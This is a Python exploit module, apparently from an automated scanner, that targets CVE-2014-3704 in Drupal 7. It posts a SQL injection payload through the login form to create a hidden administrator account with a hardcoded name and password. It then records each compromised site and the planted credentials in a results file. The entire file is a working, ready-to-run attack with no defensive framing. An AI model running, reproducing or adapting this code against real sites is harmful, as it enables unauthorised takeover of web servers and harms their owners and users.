# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    user = 'neko'
    password = 'tegal1337'
    Hash = '$S$CTo9G7Lx2FC8odOl10OKshDIRREshaeCN8.zqA9I3PT0X4cqLUJ3mBEdyl6juLsRE3EBTKNzhGXKiz5rMulPcvmBhxbLNn1'[:55]

    POSTDATA = {
        'name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,'
        '+MAX(uid)%2B1,+%27{}%27,+%27{}%27+FROM+users;insert+into+users_'
        'roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+'
        '%27{}%27),+3);;#%20%20]'.format(user, Hash, user): 'test3&name[0]',
        'name[0]': 'test',
        'pass': 'shit2',
        'test2': 'test',
        'form_build_id': '',
        'form_id': 'user_login_block',
        'op': 'Log+in'
    }
    agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
    try:
        resp = requests.post('http://' + site + '/?q=node&destination=node', timeout=10, data=POSTDATA, headers=agent)
        if "mb_strlen() expects parameter 1" in str(resp.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + '/user/login\n  Username: {}\n'
                                    '  Password: {}\n------------------------------------------\n'
                             .format(user, password))
            return printModule.returnYes(site, 'CVE-2014-3704', 'Drupal7 Add Admin', 'Drupal')
        else:
            return printModule.returnNo(site, 'CVE-2014-3704', 'Drupal7 Add Admin', 'Drupal')
    except:
        return printModule.returnNo(site, 'CVE-2014-3704', 'Drupal7 Add Admin', 'Drupal')
